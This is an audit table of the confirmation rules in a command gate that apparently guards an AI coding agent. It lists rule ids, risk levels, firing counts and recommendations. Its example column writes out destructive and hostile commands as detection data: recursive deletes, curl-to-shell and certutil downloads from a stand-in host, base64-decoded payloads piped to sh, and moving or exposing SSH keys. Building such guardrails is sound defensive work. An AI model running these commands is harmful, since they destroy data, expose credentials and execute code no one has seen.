# 18.34 gate asks audit

Sources: rules.generated.ts (decision ask), rules.ts, refs.ts, recreate.ts, gate.ts, texts.ts. packages.ts, processes.ts, upstream.ts only deny or forward engine verdicts, so they add no ask of their own. The gate keeps denials in memory only (denials.ts, withDenial), with no log file, so firings come from the probe logs and sessions.

Counts: /tmp/probe-122/logs-r2 does not exist. /tmp/probe-1831/logs-r2 (395 files) holds 0 gate ask reasons (0 hits for any ask rule id or ask text). Its 341 `requires approval` lines are Claude Code's own permission prompts (for `bun test` compound commands and generic Bash), not gate asks. The claudetto sessions hold only fixture and source mentions, none a live gate ask.

| id | guards | example | fired | risk | recommend |
|---|---|---|---|---|---|
| fs:recursively_delete_outside | This recursively deletes a top-level folder of your home directory (for example `~/projects` or `~/data`), or a director | `rm -rf ~/projects` | 0 | high | keep ask |
| fs:delete_repository | This recursively deletes a whole git repository, including any work that was never pushed. | `rm -rf ./some-repo/.git/..` | 0 | high | keep ask |
| fs:move_work_away | This moves a folder with work git does not have to a scratch folder that is cleared on its own. | `mv ~/work/app /tmp/app` | 0 | medium | keep ask |
| fs:sensitive_path | This deletes or overwrites a path you marked as sensitive (context.sensitive_paths). | `rm notes.txt (path in context.sensitive_paths)` | 0 | medium | keep ask |
| fs:chmod_credentials | This changes the permissions of your SSH or GnuPG keys so that other users can read them (ssh then refuses the keys), or | `chmod 644 ~/.ssh/id_ed25519` | 0 | high | deny |
| fs:partprobe_disk_update | Re-reading the partition table can affect mounted partitions. | `partprobe /dev/sda` | 0 | high | deny |
| fs:blockdev_disk_modify | Changing block device parameters can affect disk operations. | `blockdev --setro /dev/sda` | 0 | high | deny |
| fs:mount_operations | Mounting a raw block device can affect system stability. | `mount /dev/sdb1 /mnt` | 0 | high | deny |
| fs:filesystem_backup | Dumping or restoring a raw filesystem device can affect system stability. | `dd if=/dev/sda of=img` | 0 | high | deny |
| fs:rsync_delete | Syncs with deletion — removes files at destination not present in source. | `rsync -a --delete src/ dst/` | 0 | medium | keep ask |
| fs:shred | Shred overwrites file data at the block level, making recovery impossible unlike rm. | `shred -u file` | 0 | medium | keep ask |
| fs:truncate_zero | This truncates the file to zero bytes and erases its contents. | `truncate -s 0 app.log` | 0 | medium | keep ask |
| fs:recursive_delete_unknown_target | The deletion target comes from a variable, from another command's output (xargs, find -exec) or from a link created earl | `rm -rf $DIR` | 0 | medium | keep ask |
| fs:recursive_delete_home_glob | This deletes everything inside a directory in your home folder. | `rm -rf ~/projects/*` | 0 | high | keep ask |
| fs:recursive_delete_data_dir | This deletes a database or container-engine data directory: every database, image or volume stored there is lost. | `rm -rf /var/lib/docker` | 0 | high | deny |
| fs:recursive_delete_top_level_dir | This recursively deletes a top-level directory of the filesystem. | `rm -rf /opt` | 0 | high | deny |
| fs:overwrite_system_file | This writes to a system file or replaces a shell startup file. Overwriting it can break logins, networking or the whole  | `echo x > /etc/hosts` | 0 | high | deny |
| fs:startup_alias_replaces_command | This adds an alias to a shell startup file that makes a command run a different, destructive one (for example `ls` runni | `echo "alias ls='rm -rf'" >> ~/.zshrc` | 0 | high | deny |
| fs:delete_system_file | This deletes a system file. The system may not boot or let you log in afterwards. | `rm /etc/passwd` | 0 | high | deny |
| fs:move_system_file | This moves a system file or directory (or your home directory) away. Programs and logins that need it break until it is  | `mv /etc/hosts /tmp` | 0 | high | deny |
| fs:move_credentials | This moves SSH keys, GPG keys or cloud / cluster credentials out of your home directory (or into an archive that deletes | `mv ~/.ssh /tmp/ssh` | 0 | high | deny |
| fs:clobber_with_dev_null | This replaces the file with /dev/null and erases its contents. | `cp /dev/null file` | 0 | medium | keep ask |
| fs:chmod_critical_location | Changing permissions of the root, home or a system directory can lock you out and break SSH and system services. | `chmod -R 777 /` | 0 | high | deny |
| fs:zfs_destroy | This destroys a ZFS dataset / pool and all of its data and snapshots. | `zfs destroy tank/data` | 0 | high | deny |
| fs:recursive_owner_change_system_dir | This recursively changes the owner or permissions of a system data / service directory: the service that owns it can sto | `chown -R me /var/lib/mysql` | 0 | high | deny |
| fs:zfs_rollback_recursive | This rolls the ZFS dataset back and destroys every later snapshot (and with -R their clones). | `zfs rollback -r tank@snap` | 0 | high | deny |
| git:reset | This discards all uncommitted changes in your working tree. | `git reset --hard` | 0 | medium | keep ask |
| git:delete_all | This deletes all tracked files from the working tree. | `git rm -r .` | 0 | medium | keep ask |
| git:clean_force | This permanently deletes untracked files (and directories with -d). Git cannot restore them. | `git clean -fd` | 0 | medium | keep ask |
| git:force_push | This force-pushes and can overwrite remote history. | `git push --force origin main` | 0 | high | keep ask |
| git:force_delete_branch | This deletes a branch even if it has unmerged commits. | `git branch -D feature (session-owned; non-owned already denied by processes.ts)` | 0 | low | allow (owned only) |
| git:force_checkout | This force-checks-out and discards local changes. | `git checkout -f main` | 0 | medium | keep ask |
| git:checkout_discard_all | This discards all uncommitted changes in the working tree. | `git checkout .` | 0 | medium | keep ask |
| git:restore_discard_all | This discards all uncommitted changes in the working tree. | `git restore .` | 0 | medium | keep ask |
| git:filter_branch | This rewrites Git history. | `git filter-branch --tree-filter ...` | 0 | medium | keep ask |
| git:gc_prune | This permanently deletes unreachable objects. | `git gc --prune=now` | 0 | medium | keep ask |
| git:delete_ref | This deletes a Git reference. | `git update-ref -d refs/heads/x` | 0 | low | allow (owned only) |
| git:stash_clear | This permanently deletes all stash entries. | `git stash clear` | 0 | medium | keep ask |
| git:push_delete_branch | This deletes a remote branch or tag. | `git push origin --delete x` | 0 | high | keep ask |
| git:push_prune | This deletes every branch on the remote that does not exist locally (with --all in a fresh clone: every other branch). | `git push --prune origin` | 0 | high | keep ask |
| git:switch_discard_changes | This switches branches and discards local changes. | `git switch -f main` | 0 | medium | keep ask |
| git:config_exec_hook | This makes git run a program from the given location on every git command (hooks / ssh / fsmonitor / the ext:: transport | `git config core.fsmonitor /tmp/x` | 0 | high | deny |
| git:filter_repo | This rewrites the whole repository history (and removes the origin remote). | `git filter-repo --path x` | 0 | medium | keep ask |
| git:force_push_protected | This force-pushes (with lease) to a protected branch and rewrites its shared history. | `git push --force-with-lease origin main` | 0 | high | keep ask |
| git:force_push_unknown_target | This force-pushes (with lease) to a branch that is only known when the line runs; this repository has a protected branch | `git push --force-with-lease origin $B` | 0 | high | keep ask |
| shell:curl_pipe_to_shell | Piping remote content directly to shell executes arbitrary code without inspection. | `curl -s https://x.test/i.sh | sh` | 0 (2 fixture mentions in session test output, not real asks) | high | keep ask |
| shell:wget_pipe_to_shell | Piping downloaded content to shell executes arbitrary code without inspection. | `wget -qO- https://x.test/i.sh | sh` | 0 | high | keep ask |
| shell:eval_curl | Evaluating remote content executes arbitrary code without inspection. | `eval "$(curl -s https://x.test/i.sh)"` | 0 | high | keep ask |
| shell:curl_pipe_to_interpreter | Piping remote content to an interpreter executes arbitrary code without inspection. | `curl -s https://x.test/x.py | python3` | 0 | high | keep ask |
| shell:decode_pipe_to_shell | This decodes hidden text and runs it as shell commands, so you cannot see what it does. | `echo cm0gLXJm | base64 -d | sh` | 0 | high | deny |
| shell:eval_transformed_text | This runs (eval) text that is decoded or transformed first, so you cannot see the commands it runs. | `eval "$(echo ... | base64 -d)"` | 0 | high | deny |
| shell:process_substitution_remote | This runs a downloaded script directly (process substitution) without inspection. | `bash <(curl -s https://x.test/i.sh)` | 0 | high | keep ask |
| shell:nesting_too_deep | The command is nested too deeply (eval / $( ) / bash -c inside each other) or is too large or malformed to be analyzed s | `eval "$(bash -c 'eval ...')" nested past the depth bound` | 0 | medium | keep ask |
| shell:shell_c_remote_script | This downloads a script and runs it as shell code without inspection (`sh -c \ | `sh -c "$(curl -s https://x.test/i.sh)"` | 0 | high | keep ask |
| shell:unknown_shell_payload | This runs shell code that shellfirm cannot see before it runs (input lines executed as commands, as in `xargs -I{} sh -c | `printf x | xargs sh -c` | 0 | medium | keep ask |
| shell:powershell_download_exec | This downloads a PowerShell script and runs it (Invoke-Expression) without inspection. | `powershell iwr https://x.test/a.ps1 | iex` | 0 | high | keep ask |
| shell:lolbin_download_exec | This uses a Windows built-in tool (certutil, bitsadmin, mshta or regsvr32) to download and run code from a URL, bypassin | `certutil -urlcache -f https://x.test/a.exe a.exe` | 0 | high | deny |
| shell:powershell_encoded_command | This runs a PowerShell command hidden in base64 (-EncodedCommand), so you cannot see what it does. | `powershell -EncodedCommand JAB...` | 0 | high | deny |
| claudetto:git-push-force-with-lease | `--force-with-lease` still overwrites the remote's history when the remote matches what you last fetched. | `git push --force-with-lease origin feat` | 0 | medium | keep ask |
| claudetto:download-piped-to-shell | Piping a download into a shell runs it unread; upstream names only bare `bash`, `sh`, `zsh` and `fish`. | `curl -s https://x.test/i.sh | dash` | 0 | high | keep ask |
| GATE_HOOK_WRITE (rules.ts) | A Bash write into a plugin hooks folder (a hook is a gate on the agent) | `sed -i s/a/b/ plugins/p/hooks/x.ts` | 0 | medium | keep ask |
| GATE_UNREADABLE (rules.ts judgeText) | Command the parser cannot read, with no upstream rule matching | `$HOME/bin/git push` | 0 | medium | keep ask |
| GATE_REF_MOVE (refs.ts) | Moves a branch to another commit: reset to non-HEAD ref, update-ref, branch -f | `git reset --soft FETCH_HEAD` | 0 (1 fixture mention in session test output) | low | allow (owned only) |
| GATE_RECREATE (recreate.ts) | Recreates a file seen earlier this session that vanished outside it (may undo the user deletion) | `echo x > f.txt after f.txt was deleted externally` | 0 (1 engine deny line in session, not an ask) | medium | keep ask |
| GATE_CHECK_FAILED (gate.ts catch) | The gate itself threw; fail-safe ask | `any call when the check throws` | 0 | medium | keep ask |
